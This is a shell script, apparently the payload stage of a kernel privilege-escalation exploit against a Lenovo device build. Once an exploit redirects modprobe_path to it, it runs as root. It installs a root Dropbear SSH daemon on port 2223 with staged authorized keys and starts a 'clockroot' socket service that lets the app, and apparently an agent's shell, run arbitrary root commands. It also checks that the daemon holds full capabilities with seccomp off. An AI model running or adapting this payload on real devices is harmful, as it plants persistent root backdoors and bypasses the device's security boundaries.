#!/system/bin/sh
# root-SSH modprobe helper for build LenovoCD-24502F_ROW_1.2.2.627_220105.
#
# Invoked by the kernel usermode helper (init_cred credentials, no app seccomp)
# after the exploit temporarily points modprobe_path at this script. Builds a
# hard-owned runtime tree and starts the hardened Dropbear launcher on
# <clock-ip>:2223, then ALWAYS restores modprobe_path to /sbin/modprobe.
#
# Design constraints:
#   * every external tool is called by absolute path (PATH cannot shadow it);
#   * no grep/sed/cat/awk: POSIX sh builtins plus toybox only;
#   * fail-closed stage gating before the linker runs;
#   * result evidence is written app-readable (0600) without key material.
#
# Offline contract testing prefixes every device path with
# ROOT_SSH_HELPER_TEST_ROOT and replaces toybox/sha256sum/linker with fakes.

set -eu

# Kernel usermode helpers inherit umask 0, so the shell redirects that capture
# the launcher's output created dropbear-root.out/.err as 0666, and the
# launcher's reserved-path preflight refused them as insecure (observed
# 2026-09-18: reserved_path_preflight=failed reason=type_owner_or_mode with
# stat reporting 0|666). Everything this helper creates is private by default.
umask 077

PREFIX=${ROOT_SSH_HELPER_TEST_ROOT:-}
TOYBOX="$PREFIX/system/bin/toybox"
SHASUM="$PREFIX/system/bin/sha256sum"
LINKER="$PREFIX/system/bin/linker"
MODPROBE_SYSCTL="$PREFIX/proc/sys/kernel/modprobe"
PROC="$PREFIX/proc"

APP_FILES="$PREFIX/data/user/0/pl.mateusz.clockadbprobe/files"
STAGE="$APP_FILES/root-ssh-stage"
RESULT="$APP_FILES/root-ssh-result.txt"
TRACE="$APP_FILES/root-ssh-trace.txt"
ROOT_DIR="$PREFIX/data/misc/clock-root-ssh"
# Candidate runtime trees, first one that can actually be created wins. The
# usermode helper runs with an empty keyring, so on a device with fs-crypt
# (not metadata-encryption) creating entries under /data/misc fails with
# ENOKEY ("Required key not available") -- observed 2026-09-18. Every candidate
# is still handed to root:root at 0700, so the daemon never lives in a tree an
# app can reach.
ROOT_CANDIDATES="$PREFIX/data/misc/clock-root-ssh $APP_FILES/root-ssh-run $PREFIX/data/local/tmp/clock-root-ssh"

LISTEN="<clock-ip>:2223"
TRIGGER="binfmt-*"
EXPECTED_LAUNCHER_SHA256="1e9a51f26a057a7ebd5c3b24b2fe5b478e534c7895efef7f052292bba582ae12"

LIBRARIES="libbuffersu.so librsync.so libscp.so libsftp-server.so libsimplesshd-jni.so"
RESERVED_NAMES="dropbear-root.pid dropbear-root.out dropbear-root.err authorized_keys simplesshd_dropbear_launcher lib"

fail_stage=""
app_uid=""
app_channel="absent"
ssh_channel="absent"
ssh_stage=""
daemon_uid=""
daemon_gid=""
daemon_capeff=""
daemon_capbnd=""
daemon_seccomp=""
daemon_selinux=""

restore_modprobe() {
    printf '%s\n' /sbin/modprobe > "$MODPROBE_SYSCTL" 2>/dev/null || true
}

fail() {
    # $1 = stage tag. Always restores modprobe_path and reports fail-closed.
    fail_stage=$1
    trace "fail stage=$1"
    restore_modprobe
    printf 'result=failed\nstage=%s\n' "$fail_stage" > "$RESULT" 2>/dev/null || true
    "$TOYBOX" chmod 600 "$RESULT" 2>/dev/null || true
    exit 1
}

trace() {
    # Diagnostic breadcrumb. The caller pre-creates this file app-owned 0600 so
    # the app can read what root did, which is the only visibility we have when
    # the helper dies before writing a result. Never carries key material.
    printf '%s\n' "$1" >> "$TRACE" 2>/dev/null || true
}

require_exact_arguments() {
    # The kernel always calls modprobe_path as "modprobe -q -- <module>". The
    # module name is binfmt-<4 hex digits> and only its *value* changes; the
    # literal ffff magic used to be required, but the kernel's request_module
    # deduplicates by module name, so once a "binfmt-ffff" request is left
    # in-flight every later ffff trigger is folded into it and silently does
    # nothing (measured 2026-09-18: ffff stopped firing while 1234/5678 fired).
    # Any binfmt-* name is accepted instead; it is still a narrow, kernel-only
    # entry point.
    [ "$#" -eq 3 ] || fail stage=arguments
    [ "$1" = "-q" ] || fail stage=arguments
    [ "$2" = "--" ] || fail stage=arguments
    case "$3" in
        binfmt-*) ;;
        *) fail stage=arguments ;;
    esac
}

require_root_credentials() {
    [ "$("$TOYBOX" id -u)" = "0" ] || fail stage=credentials
}

stat_entry() {
    # $1 = path; sets stat_kind/stat_uid/stat_mode (kind|uid|mode|size).
    IFS='|'
    # shellcheck disable=SC2086 # intentional word split on the stat record
    set -- $("$TOYBOX" stat -c '%F|%u|%a|%s' "$1")
    IFS=$(printf ' \t\n')
    stat_kind=$1
    stat_uid=$2
    stat_mode=$3
}

mode_has_group_or_other_write() {
    # decimal digit math over the octal-looking %a output (e.g. 660, 700)
    mode_g=$(( (stat_mode / 10) % 10 ))
    mode_o=$(( stat_mode % 10 ))
    [ $(( mode_g & 2 )) -ne 0 ] && return 0
    [ $(( mode_o & 2 )) -ne 0 ] && return 0
    return 1
}

require_stage_regular() {
    # $1 = path, $2 = stage tag; app-owned, regular, not group/other writable.
    # Ownership is compared against the app files directory itself rather than a
    # hardcoded uid: the package uid is assigned at install time (it is 10058 on
    # this device), and a literal would silently fail the gate after a reinstall.
    stat_entry "$1"
    [ "$stat_kind" = "regular file" ] || fail "stage=$2"
    [ "$stat_uid" = "$app_uid" ] || fail "stage=$2"
    if mode_has_group_or_other_write; then fail "stage=$2"; fi
}

require_launcher_hash() {
    set -- $("$SHASUM" "$STAGE/simplesshd_dropbear_launcher")
    [ "$1" = "$EXPECTED_LAUNCHER_SHA256" ] || fail stage=stage_launcher_hash
}

require_stage_security() {
    stat_entry "$APP_FILES"
    [ "$stat_kind" = "directory" ] || fail stage=app_files
    app_uid=$stat_uid
    require_stage_regular "$STAGE/simplesshd_dropbear_launcher" \
        stage_launcher_security
    for lib in $LIBRARIES; do
        require_stage_regular "$STAGE/lib/$lib" "stage_${lib%.so}_security"
    done
    stat_entry "$STAGE/authorized_keys"
    [ "$stat_kind" = "regular file" ] || fail stage=stage_authorized_keys_security
    [ "$stat_uid" = "$app_uid" ] || fail stage=stage_authorized_keys_security
    [ "$stat_mode" = "600" ] || fail stage=stage_authorized_keys_security
}

reserved_paths_are_clean() {
    [ -e "$ROOT_DIR" ] || [ -L "$ROOT_DIR" ] || return 0
    stat_entry "$ROOT_DIR"
    [ "$stat_kind" = "directory" ] || fail stage=reserved_paths
    for name in $RESERVED_NAMES; do
        target="$ROOT_DIR/$name"
        if [ -L "$target" ]; then fail stage=reserved_paths; fi
    done
}

read_daemon_state() {
    # $1 = pid; validates root daemon posture, fills daemon_* fields.
    pid=$1
    [ -f "$PROC/$pid/status" ] || return 1
    daemon_uid=""; daemon_gid=""; daemon_capeff=""; daemon_capbnd=""
    daemon_seccomp=""; daemon_selinux=""
    while IFS= read -r line; do
        case "$line" in
            Uid:*) daemon_uid=$line ;;
            Gid:*) daemon_gid=$line ;;
            CapEff:*) daemon_capeff=$line ;;
            CapBnd:*) daemon_capbnd=$line ;;
            Seccomp:*) daemon_seccomp=$line ;;
        esac
    done < "$PROC/$pid/status"
    if [ -f "$PROC/$pid/attr/current" ]; then
        while IFS= read -r line; do
            daemon_selinux=$line
            break
        done < "$PROC/$pid/attr/current"
    fi
    [ -n "$daemon_uid" ] || return 1
    [ "$daemon_uid" = "$(printf 'Uid:\t0\t0\t0\t0')" ] || return 1
    [ "$daemon_gid" = "$(printf 'Gid:\t0\t0\t0\t0')" ] || return 1
    [ -n "$daemon_capeff" ] || return 1
    [ "$daemon_capeff" = "$(printf 'CapEff:\t0000000000000000')" ] && return 1
    [ -n "$daemon_capbnd" ] || return 1
    [ "$daemon_capbnd" = "$(printf 'CapBnd:\t0000000000000000')" ] && return 1
    [ "$daemon_seccomp" = "$(printf 'Seccomp:\t0')" ] || return 1
    return 0
}

pidfile_has_live_root_daemon() {
    # $1 = pidfile; returns 0 only for a live daemon with full root posture.
    pidfile=$1
    [ -f "$pidfile" ] || { trace "daemon pidfile missing: $pidfile"; return 1; }
    pid=""
    read -r pid < "$pidfile" || true
    case "$pid" in
        ''|*[!0-9]*) trace "daemon pidfile unparsable"; return 1 ;;
    esac
    "$TOYBOX" kill -0 "$pid" 2>/dev/null || {
        trace "daemon pid=$pid not alive"; return 1; }
    if ! read_daemon_state "$pid"; then
        trace "daemon pid=$pid posture uid=[$daemon_uid] gid=[$daemon_gid] capeff=[$daemon_capeff] capbnd=[$daemon_capbnd] seccomp=[$daemon_seccomp]"
        return 1
    fi
    return 0
}

idempotent_existing_daemon() {
    if pidfile_has_live_root_daemon "$ROOT_DIR/dropbear-root.pid"; then
        restore_modprobe
        {
            printf 'result=ready\n'
            printf 'idempotent=existing-live-pid\n'
            printf 'listen=%s\n' "$LISTEN"
            printf 'trigger=%s\n' "$TRIGGER"
            printf 'daemon_%s\n' "$daemon_uid"
            printf 'daemon_%s\n' "$daemon_gid"
            printf 'daemon_%s\n' "$daemon_capeff"
            printf 'daemon_%s\n' "$daemon_capbnd"
            printf 'daemon_%s\n' "$daemon_seccomp"
            printf 'daemon_Selinux=%s\n' "$daemon_selinux"
        } > "$RESULT"
        "$TOYBOX" chmod 600 "$RESULT"
        exit 0
    fi
}

pick_root_dir() {
    # Creates the first candidate that accepts both a directory and a
    # subdirectory (the ENOKEY failure only shows up on the second mkdir).
    for cand in $ROOT_CANDIDATES; do
        if [ -L "$cand" ]; then trace "root_dir=$cand symlink"; continue; fi
        if "$TOYBOX" mkdir -p "$cand/lib" 2>>"$TRACE" &&
           "$TOYBOX" chmod 700 "$cand" 2>>"$TRACE"; then
            ROOT_DIR=$cand
            trace "root_dir=$cand ok"
            return 0
        fi
        trace "root_dir=$cand unavailable"
    done
    fail stage=no_root_dir
}

build_root_tree() {
    trace "build_root_tree root=$ROOT_DIR"
    "$TOYBOX" mkdir -p "$ROOT_DIR" 2>>"$TRACE" ||
        { trace "mkdir_root rc=$?"; fail stage=build_root_dir; }
    "$TOYBOX" chmod 700 "$ROOT_DIR" 2>>"$TRACE" ||
        { trace "chmod_root rc=$?"; fail stage=build_root_dir; }
    "$TOYBOX" chown 0 0 "$ROOT_DIR" 2>/dev/null || true
    "$TOYBOX" mkdir -p "$ROOT_DIR/lib" 2>>"$TRACE" ||
        { trace "mkdir_lib rc=$?"; fail stage=build_root_dir; }

    "$TOYBOX" cp "$STAGE/simplesshd_dropbear_launcher" \
        "$ROOT_DIR/simplesshd_dropbear_launcher" || fail stage=install_launcher
    "$TOYBOX" chmod 500 "$ROOT_DIR/simplesshd_dropbear_launcher" \
        || fail stage=install_launcher
    "$TOYBOX" chown 0 0 "$ROOT_DIR/simplesshd_dropbear_launcher" 2>/dev/null || true

    "$TOYBOX" cp "$STAGE/authorized_keys" "$ROOT_DIR/authorized_keys" \
        || fail stage=install_authorized_keys
    "$TOYBOX" chmod 600 "$ROOT_DIR/authorized_keys" \
        || fail stage=install_authorized_keys
    "$TOYBOX" chown 0 0 "$ROOT_DIR/authorized_keys" 2>/dev/null || true

    for lib in $LIBRARIES; do
        "$TOYBOX" cp "$STAGE/lib/$lib" "$ROOT_DIR/lib/$lib" \
            || fail "stage=install_${lib%.so}"
        "$TOYBOX" chmod 500 "$ROOT_DIR/lib/$lib" \
            || fail "stage=install_${lib%.so}"
        "$TOYBOX" chown 0 0 "$ROOT_DIR/lib/$lib" 2>/dev/null || true
    done
}

run_launcher_and_validate() {
    # A redirect truncates an existing file but never retypes it, so output
    # files left at 0666 by an earlier attempt stay 0666 no matter the umask.
    # Reset them explicitly before the launcher's reserved-path preflight.
    "$TOYBOX" rm -f "$ROOT_DIR/dropbear-root.out" "$ROOT_DIR/dropbear-root.err" \
        2>/dev/null || true
    "$TOYBOX" touch "$ROOT_DIR/dropbear-root.out" \
        "$ROOT_DIR/dropbear-root.err" 2>/dev/null || true
    "$TOYBOX" chmod 600 "$ROOT_DIR/dropbear-root.out" \
        "$ROOT_DIR/dropbear-root.err" 2>/dev/null || true
    # The launcher preflights every reserved name in the root tree and refuses
    # on type/owner/mode, so record what it will see before it runs.
    for name in dropbear-root.pid dropbear-root.out dropbear-root.err; do
        trace "pre-launch $name $( { "$TOYBOX" stat -c '%F|%u|%a' \
            "$ROOT_DIR/$name"; } 2>&1 || printf 'absent')"
    done
    trace "pre-launch conf_dir $( { "$TOYBOX" stat -c '%F|%u|%a' \
        "$ROOT_DIR"; } 2>&1 || printf 'absent')"
    trace "pre-launch authorized_keys $( { "$TOYBOX" stat -c '%F|%u|%a' \
        "$ROOT_DIR/authorized_keys"; } 2>&1 || printf 'absent')"
    # A Dropbear started by an earlier trigger still holds 2223, so the launcher
    # dies with "ss already in use" and the SSH channel silently never comes up.
    # Retire it by its own pidfile (root-only path) before starting a new one.
    if [ -f "$ROOT_DIR/dropbear-root.pid" ]; then
        old_pid=""
        read -r old_pid < "$ROOT_DIR/dropbear-root.pid" || true
        case "$old_pid" in
            ''|*[!0-9]*) ;;
            *)
                if "$TOYBOX" kill "$old_pid" 2>/dev/null; then
                    trace "retired stale dropbear pid=$old_pid"
                    sleep 1
                fi
                ;;
        esac
    fi
    set +e
    "$LINKER" "$ROOT_DIR/simplesshd_dropbear_launcher" \
        "$ROOT_DIR/lib/libsimplesshd-jni.so" \
        "$ROOT_DIR" \
        "$ROOT_DIR/lib" \
        "$LISTEN" \
        > "$ROOT_DIR/dropbear-root.out" 2> "$ROOT_DIR/dropbear-root.err"
    launcher_rc=$?
    set -e
    trace "launcher rc=$launcher_rc"
    # The launcher's own output lives in the root tree, which the app cannot
    # read. Mirror it to a world-readable path so a refusal is diagnosable
    # after the fact (no key material ever appears there).
    "$TOYBOX" cp "$ROOT_DIR/dropbear-root.err" "$APP_FILES/root-ssh-launcher.err" \
        2>/dev/null && "$TOYBOX" chmod 644 "$APP_FILES/root-ssh-launcher.err" \
        2>/dev/null
    "$TOYBOX" cp "$ROOT_DIR/dropbear-root.out" "$APP_FILES/root-ssh-launcher.out" \
        2>/dev/null && "$TOYBOX" chmod 644 "$APP_FILES/root-ssh-launcher.out" \
        2>/dev/null
    # The SSH channel is a bonus: the app-facing socket is the criterion. A
    # failed launcher (usually "address already in use" when an older Dropbear
    # still holds 2223) must not stop the flow before the app channel starts,
    # which is exactly what aborting here used to do.
    if [ "$launcher_rc" -ne 0 ]; then
        ssh_stage=launcher
        trace "launcher failed rc=$launcher_rc: SSH channel skipped"
    elif pidfile_has_live_root_daemon "$ROOT_DIR/dropbear-root.pid"; then
        ssh_channel=ready
        trace "ssh channel ready pid=$pid"
    else
        ssh_stage=daemon_validation
        trace "daemon validation failed: SSH channel not confirmed"
    fi
}

start_app_channel() {
    # The app-facing root channel: clockroot serves commands over a Unix socket
    # in the app's private directory, gated by SO_PEERCRED, so the app (and the
    # agent's shell) can run root commands with no key material at all:
    #     files/clockroot -c 'id'
    # This is what makes root usable *from the app*; Dropbear stays for humans.
    app_channel=absent
    if [ ! -x "$APP_FILES/clockroot" ]; then
        trace "app channel: clockroot binary missing"
        return 0
    fi
    "$APP_FILES/clockroot" --serve >>"$TRACE" 2>&1 || true
    out=$("$APP_FILES/clockroot" -c 'id' 2>>"$TRACE" || true)
    trace "app channel probe: $out"
    case "$out" in
        *"uid=0(root)"*) app_channel=ready ;;
    esac
    return 0
}

write_success_result() {
    # Success is the app-facing root channel; the SSH daemon is reported but not
    # required, so its failure no longer masks a working root channel.
    result_state=failed
    if [ "$app_channel" = "ready" ]; then
        result_state=ready
    elif [ "$ssh_channel" = "ready" ]; then
        result_state=ready
    fi
    {
        printf 'result=%s\n' "$result_state"
        printf 'app_channel=%s\n' "$app_channel"
        printf 'ssh_channel=%s\n' "$ssh_channel"
        printf 'ssh_stage=%s\n' "$ssh_stage"
        printf 'listen=%s\n' "$LISTEN"
        printf 'trigger=%s\n' "$TRIGGER"
        printf 'daemon_%s\n' "$daemon_uid"
        printf 'daemon_%s\n' "$daemon_gid"
        printf 'daemon_%s\n' "$daemon_capeff"
        printf 'daemon_%s\n' "$daemon_capbnd"
        printf 'daemon_%s\n' "$daemon_seccomp"
        printf 'daemon_Selinux=%s\n' "$daemon_selinux"
    } > "$RESULT" || fail stage=write_result
    "$TOYBOX" chmod 600 "$RESULT" 2>/dev/null || true
}

require_exact_arguments "$@"
require_root_credentials
trace "root uid confirmed args=$*"
require_launcher_hash
trace "launcher hash ok"
require_stage_security
trace "stage security ok"
idempotent_existing_daemon
pick_root_dir
reserved_paths_are_clean
# The app-facing channel is started last on purpose: the Dropbear launcher, when
# it fails, cleans up its children, and an app channel started before it was
# observed to come up and then vanish. Nothing after this touches it.
build_root_tree
run_launcher_and_validate
start_app_channel
restore_modprobe
write_success_result
if [ "$app_channel" = "ready" ] || [ "$ssh_channel" = "ready" ]; then
    trace "ready app=$app_channel ssh=$ssh_channel"
    exit 0
fi
trace "no channel came up"
exit 1
